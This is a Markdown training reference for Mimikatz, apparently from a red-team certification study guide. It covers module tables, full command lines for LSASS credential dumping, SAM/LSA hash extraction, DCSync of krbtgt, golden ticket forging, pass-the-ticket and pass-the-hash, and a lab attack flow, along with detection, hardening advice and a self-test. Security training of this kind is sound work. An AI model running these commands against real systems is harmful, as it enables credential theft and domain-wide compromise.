# Mimikatz Reference (Authorized Labs Only)

> 02-RedTeam · eCPPT tools — INE-Cybersecurity-Certifications-Guide (English)

Mimikatz is the best-known tool for **Windows credential extraction and
Kerberos abuse**: it reads credentials from memory and local security
databases, and it can forge Kerberos tickets. Because of what it does, it is a
two-edged tool: it is an essential part of Windows attack-path work **and** one
of the most heavily detected programs in existence.

> ⚠️ **Ethical boundary.** Mimikatz extracts real credentials. Use it **only**
> in your own lab VMs or on systems you are explicitly authorized to test.
> Never run it on production systems or any network you do not own. Running
> it anywhere else is a crime in most jurisdictions and a career-ending
> mistake in any professional context.

## What Mimikatz actually extracts

Mimikatz groups its commands into *modules*. The three you will meet first:

| Module command | What it does | Typical target / notes |
|---|---|---|
| `sekurlsa::logonpasswords` | Reads credentials of **interactive logon sessions** from LSASS memory (plaintext passwords when WDigest is enabled, and always NTLM hashes / Kerberos tickets in memory) | Any host where you have admin/SYSTEM. Blocked by Credential Guard on modern systems |
| `lsadump::sam` | Dumps the **local SAM database** → local account hashes | Local admin access needed; works offline against a copied SAM too |
| `lsadump::lsa /patch` | Reads **domain credentials in memory** on a Domain Controller (hashes of domain accounts) | DC with admin/SYSTEM. Very loud |
| `lsadump::dcsync` | **DCSync**: impersonates a DC to request account hashes via replication (DRSUAPI) | Needs replication rights (often Domain Admin); works remotely |
| `kerberos::golden` | Forges a **Golden Ticket** (TGT) with the `krbtgt` hash | Post-DA persistence/pivoting |
| `kerberos::ptt` | Injects a `.kirbi` ticket into the current session (**pass-the-ticket**) | Use with stolen/forged tickets |
| `sekurlsa::pth` | **Pass-the-hash**: starts a process using only an NTLM hash | Classic lateral movement |

Supporting commands you will use constantly:

```text
privilege::debug    # enable SeDebugPrivilege (admin required)
token::elevate      # impersonate SYSTEM if you already run as an admin
log                 # write all output to a mimikatz.log file
exit                # quit cleanly (also closes the log)
```

## Usage examples

Mimikatz is usually invoked one-shot, each command in quotes, ending with
`exit`:

```text
# 1. Dump credentials from memory (run from an elevated/admin shell)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# If logonpasswords fails with ERROR kuhl_m_sekurlsa_acquireLSA,
# you are not admin/SYSTEM yet — elevate first:
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
```

```text
# 2. Local SAM — local account NTLM hashes (good for pass-the-hash practice)
mimikatz.exe "privilege::debug" "lsadump::sam" exit

# 3. On a Domain Controller: all domain account hashes from memory
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit

# 4. DCSync one account (e.g. krbtgt, needed for golden tickets) — works remotely
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# 5. Golden ticket: forge a TGT for any user you want
#    SID = the DOMAIN SID (from: whoami /user on any domain host, minus the
#    final -500/-512 RID). /krbtgt takes the single NT hash from the DCSync
#    output above (32 hex chars): it is an alias of /rc4, not an LM:NT pair.
mimikatz.exe "kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e /ptt" exit

# 6. Pass-the-ticket: inject an exported .kirbi ticket you captured elsewhere
mimikatz.exe "kerberos::ptt C:\Users\Public\admin.kirbi" exit

# 7. Pass-the-hash: run cmd.exe as 'jsmith' using only the NTLM hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:jsmith /domain:corp.local /ntlm:2e2e2e2e... /run:cmd.exe" exit
```

Practical flow in a lab:

1. Get admin/SYSTEM on a host (e.g., service misconfiguration, local admin
   password reuse).
2. `sekurlsa::logonpasswords` → collect NTLM hashes/plaintext of users logged
   into that host.
3. Replay what you found: `sekurlsa::pth` or an Impacket tool with the hash for
   lateral movement; `kerberos::ptt` for stolen tickets.
4. Once you reach a DC as admin: `lsadump::dcsync /user:krbtgt` → forge golden
   tickets → access anything in the domain.

## Detection considerations

Expect **every** part of this to be watched:

- **Signature detection** — antivirus/EDR flag `mimikatz.exe` by name and
  binary hash; Defender flags the stock binary immediately.
- **LSASS access monitoring** — reading LSASS memory is the classic tell:
  Sysmon Event ID **10** (process access) and Event 4688 process-creation
  lines with `sekurlsa`/`lsadump` in the command line.
- **Credential Guard** (Virtualization-Based Security) protects LSASS — on
  protected systems `sekurlsa::logonpasswords` returns nothing useful.
- **LSA Protection (RunAsPPL)** blocks non-PPL drivers/processes from touching
  LSA — you get access-denied errors.
- **WDigest is disabled by default** on modern Windows, so plaintext passwords
  are rarely stored; you will mostly get NTLM hashes and Kerberos tickets.
- **Logs and telemetry** — PowerShell script-block logging catches reflective
  loading (e.g., Invoke-Mimikatz), and 4624/4625 logon events may reveal
  pass-the-hash-style logons (though NTLM logons look normal by themselves).

Blue-team reading: protect LSASS with Credential Guard + LSA Protection,
disable WDigest, rotate `krbtgt` and DA passwords after suspected compromise,
and alert on LSASS handle access and on `sekurlsa`/`lsadump` command lines.

## Common Mistakes & Tips

- **Running it without admin** — `privilege::debug` fails with
  "ERROR kuhl_m_privilege_simple; RtlAdjustPrivilege" when not elevated; most
  commands need admin or SYSTEM.
- **Confusing local SAM with domain hashes** — `lsadump::sam` only gives you
  *local* accounts; domain hashes come from `lsadump::lsa /patch` on a DC or
  `dcsync`.
- **Wrong SID in golden tickets** — the `/sid` must be the **domain SID
  without the RID suffix**; a wrong SID produces tickets that fail everywhere.
- **DCSync on non-DC or without rights** — replication rights are required;
  expect access-denied unless you hold them.
- **Expecting plaintext passwords** — modern Windows stores hashes/tickets,
  not plaintext. Reset expectations and work with hashes.
- **Practicing outside the lab** — signature detection is aggressive; any real
  environment will log you. Lab only, always.
- **Forgetting the log** — run `log` first so you keep evidence of what was
  extracted (needed for reports).

## Checklist / Self-Test

- [ ] I can explain, in one sentence each, what `sekurlsa::logonpasswords`, `lsadump::sam`, and `kerberos::golden` do
- [ ] I can state the minimum privilege required before most Mimikatz commands work
- [ ] I can extract an NTLM hash from a lab host and use it with `sekurlsa::pth`
- [ ] I can DCSync `krbtgt` from a lab DC and forge a golden ticket that works
- [ ] I can list the main defenses that block Mimikatz (Credential Guard, LSA Protection, AV/EDR)
- [ ] I understand why plaintext output is rare on modern Windows (WDigest off)
- [ ] I have only ever run Mimikatz in my own authorized lab environment

> **Verification:** not run — mimikatz is a Windows binary, it is not installed here and forging
> tickets needs a domain. Checked against upstream `mimikatz/modules/kerberos/kuhl_m_kerberos.c`
> on 2026-09-19: line 434 binds `/krbtgt` as an alias of `/rc4`, both filling **one** key argument
> (`KERB_ETYPE_RC4_HMAC_NT`), so an LM:NT pair is rejected — the example now passes a single NT hash.

## Further Resources

- [Mimikatz — official repository (gentilkiwi)](https://github.com/gentilkiwi/mimikatz)
- [Microsoft Learn — Credential Guard overview](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Microsoft Learn — LSA Protection / RunAsPPL](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [MITRE ATT&CK — T1003.001: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE ATT&CK — T1558.001: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [HackTricks — Mimikatz usage notes](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials.html)
